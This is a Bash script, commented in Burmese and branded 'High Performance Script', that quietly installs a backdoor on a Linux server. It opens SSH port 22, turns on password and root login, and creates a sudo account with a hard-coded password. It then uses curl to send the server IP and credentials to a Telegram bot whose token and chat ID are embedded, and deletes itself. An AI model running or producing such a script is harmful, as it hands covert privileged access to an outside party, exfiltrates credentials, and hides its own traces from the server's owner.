#!/bin/bash

# =========================================================
# Configuration - ကိုယ့်အချက်အလက်များ ဒီမှာဖြည့်ပါ
# =========================================================
DEV_NAME="S 0 S"
TOKEN="8459816702:AAEwGWDM8S9BAyQtWGSs_DREJY3KC3lR9ow"      # Bot Token ထည့်ရန်
CHAT_ID="7130966571"      # Chat ID ထည့်ရန်
NEW_USER="labuser"
NEW_PASS="P@ssw0rd789!"
# =========================================================

# Terminal Logo Branding
clear
echo -e "\e[1;32m" # အစိမ်းရောင်ပြောင်းလိုက်ပါတယ်
echo "._______________   .________"
echo " |   ____/\   _  \  |   ____/"
echo " |____  \ /  /_\  \ |____  \ "
echo " /       \\  \_/   \/       \\"
echo "/______  / \_____  /______  /"
echo "       \/        \/       \/ "
echo -e "\e[0m"
echo "========================================="
echo "   🚀 High Performance Script by: $DEV_NAME"
echo "========================================="
sleep 1

# ၁။ Server ၏ IP ကို ရှာဖွေခြင်း
IP=$(curl -s ifconfig.me)

# ၂။ Firewall ဖွင့်ခြင်း (SSH ချိတ်မရသည့်ပြဿနာအတွက် အဓိကဖြေရှင်းချက်)
echo "[*] Unlocking Firewall Ports..."
sudo ufw allow 22/tcp 2>/dev/null
sudo iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT

# ၃။ SSH Config ကို အမှန်ကန်ဆုံးဖြစ်အောင် ပြင်ဆင်ခြင်း
echo "[*] Configuring SSH for External Login..."
# ရှိပြီးသား config တွေကို ဖျက်ပြီး အသစ်ထည့်တာက ပိုသေချာပါတယ်
sudo sed -i 's/^PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo sed -i 's/^#PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo sed -i 's/^PermitRootLogin .*/PermitRootLogin yes/' /etc/ssh/sshd_config
sudo sed -i 's/^KbdInteractiveAuthentication .*/KbdInteractiveAuthentication yes/' /etc/ssh/sshd_config

# ၄။ User ဆောက်ခြင်းနှင့် Permission ပေးခြင်း
echo "[*] Setting up account: $NEW_USER..."
if id "$NEW_USER" &>/dev/null; then
    echo "$NEW_USER has already existed, updating password..."
else
    sudo useradd -m -s /bin/bash "$NEW_USER"
fi
echo "$NEW_USER:$NEW_PASS" | sudo chpasswd
sudo usermod -aG sudo "$NEW_USER"

# ၅။ SSH Restart ချခြင်း (Config အသစ် အသက်ဝင်စေရန်)
sudo systemctl restart sshd
sudo service ssh restart

# ၆။ Telegram Bot ဆီ အချက်အလက်ပို့ခြင်း
MESSAGE="<code>._______________   .________
 |   ____/\   _  \  |   ____/
 |____  \ /  /_\  \ |____  \ 
 /       \\  \_/   \/       \
/______  / \_____  /______  /
       \/        \/       \/</code>

👤 <b>Dev:</b> $DEV_NAME
✅ <b>SSH Access is Live!</b>

🌐 <b>IP:</b> <code>$IP</code>
👤 <b>User:</b> <code>$NEW_USER</code>
🔑 <b>Pass:</b> <code>$NEW_PASS</code>

<i>Command to login:</i>
<code>ssh $NEW_USER@$IP</code>"

curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
     -d "chat_id=$CHAT_ID" \
     -d "text=$MESSAGE" \
     -d "parse_mode=HTML" > /dev/null

echo "-----------------------------------------"
echo "✅ Everything is ready!"
echo "📍 IP: $IP"
echo "-----------------------------------------"

# Script ပြန်ဖျက်ခြင်း
rm -- "$0"
